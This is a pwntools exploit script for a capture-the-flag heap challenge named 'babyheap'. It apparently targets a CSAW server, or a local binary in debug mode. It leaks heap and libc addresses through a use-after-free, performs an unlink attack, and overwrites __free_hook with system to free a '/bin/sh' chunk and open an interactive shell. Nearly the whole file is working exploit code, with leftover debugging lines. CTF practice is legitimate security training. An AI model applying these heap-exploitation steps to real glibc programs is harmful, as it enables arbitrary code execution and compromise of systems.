#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *
import time

#context.arch = 'amd64'
DEBUG = True
if DEBUG:
	io = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babyheap")
else:
	io = remote("pwn.chal.csaw.io","9001")

def alloc(index,content):
	#1:time.sleep(0.2)
	io.sendlineafter("Choice:","1")
	io.sendlineafter("Index:",str(index))
	io.sendlineafter("Content:",content)
	io.recvuntil("Done!\n")

def edit(index,content):
	io.sendlineafter("Choice:","2")
	io.sendlineafter("Index:",str(index))
	io.sendlineafter("Content:",content)
	io.recvuntil("Done!\n")

def show(index):
	io.sendlineafter("Choice:","3")
	io.sendlineafter("Index:",str(index))
	return io.recvuntil("Done!\n")
	
def free(index):
	io.sendlineafter("Choice:","4")
	io.sendlineafter("Index:",str(index))
	io.recvuntil("Done!\n")

def leak_heap():
	alloc(0,"a"*8)
	alloc(1,"b"*8)
	free(1)
	free(0)
	#free(0)
	#alloc(2,"c"*8)
	#alloc(3,"d"*8)
	heap_addr = u64(show(0)[:4].ljust(8,"\x00"))
	heap_base = heap_addr - 0x30
	log.success("heap_base:"+hex(heap_base))
	return heap_base

def leak_libc(heap_base):
	gdb.attach(io,"b *0x0000000000400928")
	time.sleep(1)
	bss_addr = 0x0000000000602060
	edit(0,p64(heap_base+0x20)+p64(0x31))
	alloc(2,(p64(0)+p64(0x31))*2)
	payload = p64(bss_addr+0x18-0x18) + p64(bss_addr+0x18-0x10)
	alloc(3,p64(0)+p64(0xb0)+payload)
	#free(3)
	#edit(3,p64(heap_base+0x20)+p64(0x31))
	#alloc(4,(p64(0)+p64(0x31))*2)
	#alloc(5,(p64(0)+p64(0x101))*2)
	alloc(4,"/bin/sh")
	alloc(5,(p64(0x100)+p64(0x31))*2)
	alloc(6,(p64(0xb0)+p64(0x31))*2)
	alloc(7,(p64(0xb0)+p64(0x31))*2)
	#alloc(8,(p64(0xb0)+p64(0x101))*2)
	free(1)
	libc_addr = u64(show(1)[:6].ljust(8,"\x00"))
	print hex(libc_addr)
	offset = 0x7f4d1fd99b78 - 0x7f4d1f9d5000
	libc_base = libc_addr - offset
	log.success("libc_base:"+hex(libc_base))
	return libc_base
	
def unlink_attack(libc_base):
	gdb.attach(io,"b *0x0000000000400928")
	libc.address = libc_base
	free_hook = libc.symbols["__free_hook"]
	system = libc.symbols["system"]
	#one_gadget = libc_base + 0x0
	log.success("free_hook:"+hex(free_hook))
	log.success("system:"+hex(system))
	edit(3,p64(free_hook))
	edit(0,p64(system))
	io.sendlineafter("Choice:","4")
	io.sendlineafter("Index:","4")
	#edit()
		
context.log_level = "debug"
#io = process("./doubletrouble")
io.recvuntil("Loading.....\n")
#gdb.attach(io,"b *0x0000000000400928"
unlink_attack(leak_libc(leak_heap()))
io.interactive()
	
